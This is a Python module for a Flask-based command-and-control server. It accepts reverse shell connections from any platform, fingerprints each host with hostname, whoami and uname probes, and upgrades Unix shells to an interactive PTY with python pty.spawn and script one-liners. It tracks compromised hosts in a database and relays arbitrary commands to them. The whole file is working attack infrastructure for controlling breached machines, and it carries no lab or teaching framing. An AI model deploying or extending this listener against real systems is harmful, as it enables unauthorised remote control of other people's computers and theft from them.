"""Reverse shell listener and management service."""
from __future__ import annotations

import secrets
import socket
import threading
import time
from datetime import datetime
from typing import Dict, Optional

from flask import Flask

from app.extensions import db
from app.models import ReverseShell, ShellExecution
from app.utils import clean_shell_output


class ShellConnection:
    """Represents an active reverse shell connection."""
    
    def __init__(self, conn: socket.socket, addr: tuple, shell_id: int, platform: str = "Unknown"):
        self.conn = conn
        self.addr = addr
        self.shell_id = shell_id
        self.platform = platform
        self.lock = threading.Lock()
        self.is_active = True
        self.ws_attached = False  # True when a WebSocket terminal is actively reading
        
    def send_command(self, command: str, timeout: int = 120) -> str:
        """Send command to shell and receive output.

        Args:
            command: The shell command to execute.
            timeout: Maximum seconds to wait for output (default 120 / 2 min).

        If the command does not finish within *timeout* seconds the
        connection is considered tainted (e.g. by ``sudo`` waiting for
        a password or ``ping`` running forever) and the connection is
        closed so the reverse-shell client can reconnect cleanly.
        """
        timed_out = False
        with self.lock:
            try:
                if not self.is_active:
                    return "Error: Connection is not active"

                # Drain any buffered data (e.g. from keepalive prompts)
                self.conn.settimeout(0.5)
                try:
                    while True:
                        leftover = self.conn.recv(4096)
                        if not leftover:
                            break
                except (socket.timeout, OSError):
                    pass

                # Send command
                self.conn.settimeout(timeout)
                cmd_bytes = (command.strip() + '\n').encode('utf-8')
                self.conn.sendall(cmd_bytes)

                # Receive response with hard deadline
                output = b""
                deadline = time.time() + timeout
                idle_timeout = 3  # seconds of silence to consider command done
                self.conn.settimeout(idle_timeout)

                while True:
                    remaining = deadline - time.time()
                    if remaining <= 0:
                        timed_out = True
                        break
                    try:
                        self.conn.settimeout(min(idle_timeout, remaining))
                        chunk = self.conn.recv(4096)
                        if not chunk:
                            break
                        output += chunk
                    except socket.timeout:
                        # No data received within idle_timeout
                        if output:
                            # Got some output and then silence – command likely finished
                            break
                        # No output at all yet – keep waiting until deadline
                        continue

                output_str = output.decode('utf-8', errors='replace')
                output_str = clean_shell_output(output_str, command)

                if timed_out:
                    # Connection is tainted – close it so it can reconnect
                    self.is_active = False
                    try:
                        self.conn.close()
                    except Exception:
                        pass
                    notice = f"\n\n⚠️ Command timed out after {timeout}s. Session closed – it will reconnect automatically."
                    return output_str + notice

                return output_str
            except Exception as exc:
                self.is_active = False
                return f"Error: {exc}"
    
    def close(self):
        """Close the connection."""
        self.is_active = False
        try:
            self.conn.close()
        except Exception:
            pass


class ShellListener:
    """Manages reverse shell connections."""
    
    def __init__(self, app: Flask, port: int = 5000):
        self.app = app
        self.port = port
        self.server_socket: Optional[socket.socket] = None
        self.is_running = False
        self.listener_thread: Optional[threading.Thread] = None
        self.connections: Dict[int, ShellConnection] = {}
        self.lock = threading.Lock()
        
    def start(self):
        """Start the listener in a background thread."""
        if self.is_running:
            return
        
        self.is_running = True
        self.listener_thread = threading.Thread(target=self._listen, daemon=True)
        self.listener_thread.start()
        
    def stop(self):
        """Stop the listener."""
        self.is_running = False
        if self.server_socket:
            try:
                self.server_socket.close()
            except Exception:
                pass
        
        # Close all active connections
        with self.lock:
            for conn in self.connections.values():
                conn.close()
            self.connections.clear()
    
    def _listen(self):
        """Main listener loop."""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            # Bind to all interfaces (0.0.0.0) to accept reverse shell connections
            # from remote systems. This is intentional for a C2 listener.
            # In production, use firewall rules to restrict access.
            self.server_socket.bind(('0.0.0.0', self.port))  # nosec B104
            self.server_socket.listen(50)  # Allow up to 50 queued connections
            self.server_socket.settimeout(1.0)  # Timeout to check is_running periodically
            
            print(f"[*] Reverse shell listener started on port {self.port}")
            
            while self.is_running:
                try:
                    conn, addr = self.server_socket.accept()
                    # Handle connection in separate thread
                    handler_thread = threading.Thread(
                        target=self._handle_connection,
                        args=(conn, addr),
                        daemon=True
                    )
                    handler_thread.start()
                except socket.timeout:
                    continue
                except Exception as exc:
                    if self.is_running:
                        print(f"[!] Listener error: {exc}")
                    break
                    
        except Exception as exc:
            print(f"[!] Failed to start listener: {exc}")
        finally:
            if self.server_socket:
                self.server_socket.close()
            print("[*] Reverse shell listener stopped")
    
    def _handle_connection(self, conn: socket.socket, addr: tuple):
        """Handle a new reverse shell connection."""
        ip, port = addr
        print(f"[+] New connection from {ip}:{port}")

        # Enable TCP-level keepalive so the OS detects dead connections
        # without us sending application-level commands.
        try:
            conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        except OSError:
            pass

        shell_id = None
        try:
            with self.app.app_context():
                # Accept any connection that arrives on the listener port.
                # This supports all shell types: Linux bash/sh, Windows
                # cmd/PowerShell, macOS zsh, Python/PHP/Ruby/Java shells,
                # netcat, Invoke-Expression loops, and any other reverse
                # shell payload.

                initial_banner = b""
                try:
                    conn.settimeout(3)
                    initial_banner = conn.recv(4096)
                except (socket.timeout, OSError):
                    pass

                # Detect platform early from the banner — if the shell
                # sent something that looks like Windows, we skip Unix
                # probes entirely to avoid confusing the shell.
                banner_text = initial_banner.decode('utf-8', errors='replace') if initial_banner else ''
                win_indicators = ['Windows', 'Microsoft', 'MINGW', 'MSYS',
                                  'CYGWIN', 'PowerShell', 'PS C:\\', 'C:\\']
                detected_windows = any(w in banner_text for w in win_indicators)

                hostname = f"host-{ip}"
                platform = "Windows" if detected_windows else "Unknown"
                shell_user = "unknown"

                # --- Lightweight info gathering ---
                # Only attempt ONE probe command per field.  Each probe
                # waits at most 3 s for a response.  If the shell doesn't
                # respond we simply keep defaults — this prevents
                # overwhelming slow / PowerShell shells with a burst of
                # commands.
                try:
                    marker_id = secrets.token_hex(4)
                    ms = f"C2S{marker_id}"
                    me = f"C2E{marker_id}"

                    def _extract(raw: str) -> str:
                        s = raw.rfind(ms)
                        e = raw.rfind(me)
                        if s >= 0 and e > s:
                            block = raw[s + len(ms):e].strip()
                            lines = [l.strip() for l in block.split('\n')
                                     if l.strip() and ms not in l and me not in l]
                            return lines[0] if lines else ""
                        cleaned = clean_shell_output(raw).strip()
                        lines = [l for l in cleaned.split('\n') if l.strip()]
                        return lines[-1].strip() if lines else ""

                    def _probe(cmd: str, wait: float = 1.5) -> str:
                        """Send a single probe and return the output."""
                        # Drain stale data
                        conn.settimeout(0.3)
                        try:
                            while conn.recv(4096):
                                pass
                        except (socket.timeout, OSError):
                            pass
                        conn.sendall(cmd.encode('utf-8'))
                        time.sleep(wait)
                        buf = b""
                        conn.settimeout(3)
                        try:
                            while True:
                                chunk = conn.recv(4096)
                                if not chunk:
                                    break
                                buf += chunk
                        except (socket.timeout, OSError):
                            pass
                        return buf.decode('utf-8', errors='replace')

                    # hostname — works on both Unix and Windows
                    raw = _probe(f'echo {ms}; hostname; echo {me}\n')
                    h = _extract(raw)
                    if h:
                        hostname = h

                    # whoami
                    raw = _probe(f'echo {ms}; whoami; echo {me}\n')
                    u = _extract(raw)
                    if u:
                        shell_user = u

                    # OS detection (only if not already detected from banner)
                    if not detected_windows:
                        raw = _probe(f'echo {ms}; uname -s; echo {me}\n')
                        if 'Linux' in raw:
                            platform = 'Linux'
                        elif 'Darwin' in raw:
                            platform = 'macOS'
                        elif any(w in raw for w in win_indicators):
                            platform = 'Windows'
                        else:
                            raw2 = _probe(f'echo {ms}; ver; echo {me}\n')
                            if any(w in raw2 for w in ['Windows', 'Microsoft']):
                                platform = 'Windows'

                except Exception:
                    pass  # keep defaults

                # PTY upgrade — only for Unix-like systems
                if platform not in ('Windows',):
                    try:
                        pty_cmd = (
                            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null "
                            "|| python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null "
                            "|| python3 -c 'import pty; pty.spawn(\"/bin/sh\")' 2>/dev/null "
                            "|| script -qc /bin/bash /dev/null 2>/dev/null "
                            "|| script -qc /bin/sh /dev/null 2>/dev/null\n"
                        )
                        conn.sendall(pty_cmd.encode('utf-8'))
                        time.sleep(1.5)
                        conn.settimeout(2)
                        try:
                            while conn.recv(4096):
                                pass
                        except (socket.timeout, OSError):
                            pass
                        conn.sendall(b'stty rows 50 cols 200 2>/dev/null; export TERM=xterm-256color\n')
                        time.sleep(0.5)
                        conn.settimeout(1)
                        try:
                            conn.recv(4096)
                        except (socket.timeout, OSError):
                            pass
                    except Exception:
                        pass

                # Create or update shell record – match by IP address only
                # so that reconnections from the same host reuse the
                # existing record.
                default_hostname = f"host-{ip}"
                shell = ReverseShell.query.filter_by(address=ip).first()
                if not shell:
                    session_id = secrets.token_urlsafe(16)
                    shell = ReverseShell(
                        session_id=session_id,
                        name=hostname or f"shell-{ip}",
                        address=ip,
                        port=port,
                        hostname=hostname,
                        platform=platform,
                        shell_user=shell_user,
                        status="connected",
                        connected_at=datetime.utcnow(),
                        last_seen=datetime.utcnow(),
                    )
                    db.session.add(shell)
                else:
                    shell.port = port
                    if not shell.session_id:
                        shell.session_id = secrets.token_urlsafe(16)
                    shell.status = "connected"
                    shell.disconnected_at = None
                    shell.connected_at = datetime.utcnow()
                    shell.last_seen = datetime.utcnow()
                    if hostname and hostname != default_hostname:
                        shell.hostname = hostname
                        shell.name = hostname
                    if platform and platform != 'Unknown':
                        shell.platform = platform
                    if shell_user and shell_user != "unknown":
                        shell.shell_user = shell_user

                db.session.commit()
                shell_id = shell.id

                with self.lock:
                    self.connections[shell_id] = ShellConnection(
                        conn, addr, shell_id, platform=platform)

                print(f"[+] Shell registered: {shell.name} (ID: {shell_id}, Session: {shell.session_id})")

                # Broadcast notification
                try:
                    from app.extensions import socketio
                    socketio.emit("new_shell_connected", {
                        "id": shell_id,
                        "name": shell.name,
                        "address": addr[0],
                        "platform": platform,
                        "hostname": hostname,
                    })
                except Exception:
                    pass

                # --- Keepalive loop ---
                # We do NOT send commands for keepalive.  Instead we rely
                # on TCP-level SO_KEEPALIVE (set above) and periodically
                # attempt a non-destructive zero-byte peek on the socket.
                # This avoids confusing PowerShell Invoke-Expression loops
                # and other non-standard shells.
                while self.is_running and self.connections.get(shell_id):
                    try:
                        time.sleep(15)

                        shell_conn = self.connections.get(shell_id)
                        if not shell_conn or not shell_conn.is_active:
                            break

                        # Check if the socket is still alive via non-blocking peek
                        try:
                            conn.settimeout(0)
                            data = conn.recv(1, socket.MSG_PEEK)
                            if data == b'':
                                # Peer closed the connection
                                print(f"[-] Shell {shell_id} — peer closed connection")
                                break
                        except BlockingIOError:
                            # No data available — socket is alive (good)
                            pass
                        except (ConnectionResetError, BrokenPipeError,
                                ConnectionAbortedError, OSError):
                            print(f"[-] Keepalive check failed for shell {shell_id}")
                            break

                        # Update last_seen
                        with self.app.app_context():
                            shell_record = db.session.get(ReverseShell, shell_id)
                            if shell_record:
                                shell_record.last_seen = datetime.utcnow()
                                db.session.commit()
                    except Exception:
                        break
                        
        except Exception as exc:
            print(f"[!] Error handling connection from {ip}:{port}: {exc}")
        finally:
            # Clean up
            if shell_id:
                with self.lock:
                    if shell_id in self.connections:
                        self.connections[shell_id].close()
                        del self.connections[shell_id]
                
                with self.app.app_context():
                    shell = db.session.get(ReverseShell, shell_id)
                    if shell:
                        shell.status = "disconnected"
                        shell.disconnected_at = datetime.utcnow()
                        db.session.commit()
                
                print(f"[-] Shell disconnected: ID {shell_id}")
    
    def execute_command(self, shell_id: int, command: str, timeout: int = 120) -> tuple[bool, str]:
        """Execute a command on a connected shell.

        The default timeout is 120 seconds (2 minutes).  If the command
        exceeds this, the underlying connection is closed so the
        reverse-shell client can reconnect cleanly.
        """
        with self.lock:
            conn = self.connections.get(shell_id)
            if not conn or not conn.is_active:
                return False, "Shell is not connected"

        output = conn.send_command(command, timeout)

        # If the connection was closed due to timeout, clean up
        if not conn.is_active:
            with self.lock:
                self.connections.pop(shell_id, None)
            with self.app.app_context():
                shell = db.session.get(ReverseShell, shell_id)
                if shell:
                    shell.status = "disconnected"
                    shell.disconnected_at = datetime.utcnow()
                    db.session.commit()
            return True, output

        return True, output
    
    def get_active_shells(self) -> list[int]:
        """Get list of active shell IDs."""
        with self.lock:
            return list(self.connections.keys())


# Global listener instance
_listener: Optional[ShellListener] = None


def get_listener(app: Flask, port: int = 5000) -> ShellListener:
    """Get or create the global listener instance."""
    global _listener
    if _listener is None:
        _listener = ShellListener(app, port)
    return _listener


def start_listener(app: Flask):
    """Start the reverse shell listener."""
    port = app.config.get('REVERSE_SHELL_PORT', 5000)
    listener = get_listener(app, port)
    listener.start()
